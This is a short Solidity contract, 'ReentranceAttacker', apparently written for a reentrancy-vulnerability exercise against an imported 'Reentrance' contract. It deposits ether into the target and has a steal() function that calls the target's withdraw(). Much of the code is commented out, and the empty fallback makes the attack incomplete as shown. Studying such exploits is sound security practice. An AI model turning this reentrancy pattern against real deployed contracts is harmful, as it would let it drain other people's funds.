pragma solidity ^0.4.4;
import "./Reentrance.sol";

contract ReentranceAttacker {
	// deployer is owner
	address private owner;

	function ReentranceAttacker() {
		owner = msg.sender;
	}

	function () payable public {
		// able to receive funds
	}

	function depositToExternal(address reentranceAddress) payable public {
		assert(owner == msg.sender);
		Reentrance r = Reentrance(reentranceAddress);
		return r.deposit.gas(100000).value(msg.value)();
		// reentranceAddress.call.gas(0).value(1 ether)(bytes7(sha3("deposit()")));
	}

	// function depositToExternal(address reentranceAddress, uint amount) payable public {
	// 	assert(owner == msg.sender);
	// 	Reentrance r = Reentrance(reentranceAddress);
	// 	r.transfer(amount);
	// 	// reentranceAddress.send(amount);
	// }

	// function withdrawFromExternal(address reentranceAddress) private {
	// 	Reentrance r = Reentrance(reentranceAddress);
	// 	r.withdraw();
	// }

	function steal() payable public {
		Reentrance r = Reentrance(msg.sender);
		r.withdraw();
	}
}